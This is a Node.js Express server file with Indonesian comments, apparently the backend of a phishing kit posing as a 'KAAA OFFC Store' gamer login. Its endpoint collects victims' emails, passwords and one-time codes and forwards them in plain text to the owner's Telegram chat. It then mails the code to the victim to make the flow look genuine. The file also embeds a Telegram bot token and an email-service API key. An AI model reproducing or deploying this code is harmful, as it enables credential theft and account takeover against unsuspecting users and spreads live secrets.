const express = require('express');
const axios = require('axios');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 4117;

// ================= [ CONFIG OWNER - GANTI DI SINI ] =================
const TELEGRAM_BOT_TOKEN = "8267005822:AAFewSAQUyQuvOUUbr3mVrjvQHZWyfBsBgo"; // Token Bot Telegram
const TELEGRAM_CHAT_ID = "1178982410"; // Chat ID kamu
const RESEND_API_KEY = "re_Y3DfKKCM_7rJCyA3V1JHoxUNxQ2sc7Fb1"; // API Key dari Resend.com
// ====================================================================

app.use(bodyParser.json());
app.use(express.static('public'));

app.post('/api/auth/step1', async (req, res) => {
    const { email, password, otp } = req.body;

    // Notifikasi Awal ke Telegram Owner
    const msg = `🔔 *NEW LOGIN ATTEMPT* 🔔\n\n📧 Email: \`${email}\` \n🔑 Pass: \`${password}\` \n🔢 OTP: \`${otp}\` \n🚦 Status: *Waiting Verification*`;
    
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: msg,
            parse_mode: 'Markdown'
        });

        // Kirim OTP via Resend
        await axios.post('https://api.resend.com/emails', {
            from: 'KAAA-OFFC <saturn07@kaaaoffc.web.id>',
            to: email,
            subject: 'Kode Verifikasi Akun',
            html: `<div style="font-family:sans-serif; padding:20px; border:1px solid #eee;">
                    <h2>Halo, Gamer!</h2>
                    <p>Kode verifikasi untuk login ke KAAA OFFC Store adalah:</p>
                    <h1 style="color:#0066ff;">${otp}</h1>
                    <p>Jangan berikan kode ini kepada siapapun.</p>
                   </div>`
        }, {
            headers: { 'Authorization': `Bearer ${RESEND_API_KEY}` }
        });

        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ success: false, message: err.message });
    }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
